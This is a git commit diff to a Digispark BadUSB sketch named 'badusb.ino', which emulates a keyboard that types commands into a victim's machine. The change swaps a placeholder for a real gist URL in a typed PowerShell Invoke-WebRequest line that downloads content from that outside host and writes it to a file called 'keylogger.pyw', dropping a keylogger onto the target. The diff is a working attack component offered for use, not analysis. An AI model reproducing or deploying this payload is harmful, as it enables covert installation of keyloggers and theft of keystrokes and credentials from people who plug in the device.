b7758659d2e717ff6b493ca365fab086cedd4307
Santiago Castrillon <50801625+san2003@users.noreply.github.com>
2025-11-05 12:00:58 -0300

    Update badusb.ino

--- badusb.ino
+++ badusb.ino
@@ -10,7 +10,7 @@ void setup() {
     delay(500);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     delay(500);
-    DigiKeyboard.print("Invoke-WebRequest -Uri \"YOUR_SCRIPT_URL_HERE\" | select -ExpandProperty Content | Out-File -append -encoding utf8 keylogger.pyw");
+    DigiKeyboard.print("Invoke-WebRequest -Uri \"https://gist.github.com/san2003/b27d7e5944488c86597ed9af46691755\" | select -ExpandProperty Content | Out-File -append -encoding utf8 keylogger.pyw");
     delay(500);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     delay(1000);
